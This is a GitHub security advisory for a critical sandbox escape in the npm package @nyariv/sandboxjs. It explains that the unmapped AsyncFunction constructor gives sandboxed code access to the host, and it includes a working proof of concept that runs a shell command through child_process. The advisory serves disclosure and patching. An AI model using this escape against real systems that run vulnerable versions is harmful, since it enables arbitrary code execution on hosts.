# [C] SandboxJS has Sandbox Escape via Unprotected AsyncFunction Constructor

## Summary
Severity: Critical
Advisory: GHSA-wxhw-j4hc-fmq6
CVE: CVE-2026-23830
CWE: CWE-693, CWE-913, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-27
Source: https://github.com/advisories/GHSA-wxhw-j4hc-fmq6
Type: github-advisory

## Affected
- npm: `@nyariv/sandboxjs` — affected >=0 <0.8.26

## Details
### Summary
A sandbox escape vulnerability due to `AsyncFunction` not being isolated in `SandboxFunction`

### Details

The library attempts to sandbox code execution by replacing the global `Function` constructor with a safe, sandboxed version (`SandboxFunction`). This is handled in `utils.ts` by mapping `Function` to `sandboxFunction` within a map used for lookups.

However, the library did not include mappings for `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction`. These constructors are not global properties but can be accessed via the `.constructor` property of an instance (e.g., `(async () => {}).constructor`).

In `executor.ts`, property access is handled. When code running inside the sandbox accesses `.constructor` on an async function (which the sandbox allows creating), the `executor` retrieves the property value. Since `AsyncFunction` was not in the safe-replacement map, the `executor` returns the actual native host `AsyncFunction` constructor.

Constructors for functions in JavaScript (like `Function`, `AsyncFunction`) create functions that execute in the global scope. By obtaining the host `AsyncFunction` constructor, an attacker can create a new async function that executes entirely outside the sandbox context, bypassing all restrictions and gaining full access to the host environment (Remote Code Execution).

### PoC

```js
const sandbox = require('@nyariv/sandboxjs');
const s = new sandbox.default();

const payload = `
    const af = async () => {};
    // .constructor returns the host AsyncFunction constructor because it's not intercepted
    const AsyncConstructor = af.constructor;
    console.log("AsyncConstructor name:", AsyncConstructor.name);
    
    // Create a function that executes outside the sandbox
    const func = AsyncConstructor("return process.mainModule.require('child_process').execSync('id').toString()");
    
    // Execute RCE
    const p = func();
    p.then(proc => {
        console.log(proc);
    });
`;

try {
    s.compile(payload)().run();
} catch (e) {
    console.error("Bypass failed:", e.message);
}
```

Run above script in nodejs. If you run it in browser, change the `AsyncConstructor` argument by returning `window` object. 

### Impact

A Remote Code Execution, attacker may be able to run an arbitrary code.

## References
- https://github.com/nyariv/SandboxJS/security/advisories/GHSA-wxhw-j4hc-fmq6
- https://nvd.nist.gov/vuln/detail/CVE-2026-23830
- https://github.com/nyariv/SandboxJS/commit/345aee6566e47979dee5c337b925b141e7f78ccd
- https://github.com/nyariv/SandboxJS
